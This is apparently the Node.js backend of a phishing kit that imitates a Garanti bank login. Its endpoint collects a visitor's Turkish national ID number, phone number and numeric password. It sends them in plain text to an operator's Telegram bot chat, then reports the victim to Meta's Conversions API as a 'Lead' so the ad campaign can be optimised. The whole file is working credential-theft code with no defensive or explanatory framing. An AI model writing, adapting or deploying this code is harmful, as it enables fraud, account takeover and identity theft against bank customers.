const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');

if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config();
}

const app = express();
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const metaToken = process.env.META_CONVERSIONS_TOKEN;
const pixelId = process.env.META_PIXEL_ID;

if (!botToken || !chatId) throw new Error('BOT_TOKEN ve CHAT_ID zorunlu!');
if (!metaToken || !pixelId) throw new Error('META_CONVERSIONS_TOKEN ve META_PIXEL_ID zorunlu!');

app.use(express.json());
app.use(cors({ origin: '*', methods: ['POST'], allowedHeaders: ['Content-Type'] }));

const parseCookie = (cookieHeader) => {
  if (!cookieHeader) return {};
  return cookieHeader.split(';').reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split('=');
    acc[key] = value;
    return acc;
  }, {});
};

const sendToMetaWithRetry = async (payload, maxRetries = 3) => {
  let lastError;
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await axios.post(
        `https://graph.facebook.com/v20.0/${pixelId}/events?access_token=${metaToken}`,
        payload,
        { timeout: 10000 }
      );
      if (response.data.events_received > 0) {
        console.log(`CAPI Başarılı: ${response.data.events_received} event gönderildi.`);
        return response.data;
      }
    } catch (error) {
      lastError = error;
      const status = error.response?.status;
      if (status >= 500 || error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
        const delay = Math.pow(2, i) * 1000;
        console.warn(`CAPI 5xx/timeout, retry ${i + 1}/${maxRetries} after ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      } else {
        console.error('CAPI 4xx hata:', error.response?.data || error.message);
        break;
      }
    }
  }
  throw lastError;
};

app.post('/submit', async (req, res) => {
  const { tc, phone, password, eventID, initEventID, fbp, fbc } = req.body;

  if (!tc || !phone || !password || !eventID) {
    return res.status(400).json({ error: 'TC, telefon, şifre ve eventID zorunlu.' });
  }

  if (!/^\d{11}$/.test(tc)) {
    return res.status(400).json({ error: 'Geçersiz TC Kimlik Numarası. 11 haneli ve sadece rakamlardan oluşmalı.' });
  }

  if (!/^5\d{9}$/.test(phone)) {
    return res.status(400).json({ error: 'Geçersiz telefon numarası. 10 haneli olmalı, 5 ile başlamalı (örnek: 5551234567).' });
  }

  if (!/^\d+$/.test(password)) {
    return res.status(400).json({ error: 'Şifre sadece rakamlardan oluşmalı.' });
  }

  const message = `Yeni Kullanıcı:\nTC: ${tc}\nTel: ${phone}\nŞifre: ${password}`;
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    await axios.post(telegramUrl, { chat_id: chatId, text: message, parse_mode: 'HTML' });
    console.log('Telegram gönderildi.');

    const now = Math.floor(Date.now() / 1000);
    const normalizedPhone = `+90${phone}`;
    const hashData = (data) => crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
    const hashedPhone = hashData(normalizedPhone);
    const cookies = parseCookie(req.headers.cookie);

    let fbcValue = fbc || cookies._fbc;
    if (!fbcValue && req.query.fbclid) {
      const creationTime = Math.floor(Date.now() / 1000);
      fbcValue = `fb.1.${creationTime}.${req.query.fbclid}`;
    }

    const fbpValue = fbp && /^fb\.1\.\d+\.\d+$/.test(fbp) 
      ? fbp 
      : (cookies._fbp && /^fb\.1\.\d+\.\d+$/.test(cookies._fbp) ? cookies._fbp : undefined);

    const userData = {
      ph: [hashedPhone],
      client_ip_address: (req.headers['x-forwarded-for'] || '').split(',')[0]?.trim() || req.socket.remoteAddress || '',
      client_user_agent: req.headers['user-agent'] || 'unknown',
    };
    if (fbcValue) userData.fbc = fbcValue;
    if (fbpValue) userData.fbp = fbpValue;

    const currentHost = req.headers['x-forwarded-host'] || req.headers['host'] || 'fallback-domain.com';
    const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';

    const payload = {
      data: [
        ...(initEventID ? [{
          event_name: 'InitiateCheckout',
          event_time: now - 10,
          action_source: 'website',
          event_source_url: `${protocol}://${currentHost}/`,
          event_id: initEventID,
          user_data: userData,
          custom_data: {
            content_category: 'garanti_credit_form_start',
            content_name: 'garanti_login_start',
            value: 0.5,
            currency: 'TRY'
          },
        }] : []),
        {
          event_name: 'Lead',
          event_time: now,
          action_source: 'website',
          event_source_url: `${protocol}://${currentHost}/telefon`,
          event_id: eventID,
          user_data: userData,
          custom_data: {
            content_category: 'garanti_lead_form',
            content_name: 'garanti_phone_verification',
            value: 1,
            currency: 'TRY'
          },
        },
      ].filter(Boolean),
    };

    await sendToMetaWithRetry(payload);

    res.json({ message: 'Gönderildi.' });
  } catch (error) {
    console.error('Kritik hata:', error.response?.data || error.message);
    try {
      await axios.post(telegramUrl, {
        chat_id: chatId,
        text: `CAPI HATASI:\n${error.message}\nEventID: ${eventID || 'yok'}`,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.error('Telegram hata bildirimi başarısız:', telegramError.message);
    }
    res.status(500).json({ error: 'Sunucu hatası.' });
  }
});

module.exports = app;

if (process.env.NODE_ENV !== 'production') {
  const port = process.env.PORT || 3001;
  app.listen(port, () => console.log(`Yerel sunucu: http://localhost:${port}`));
}
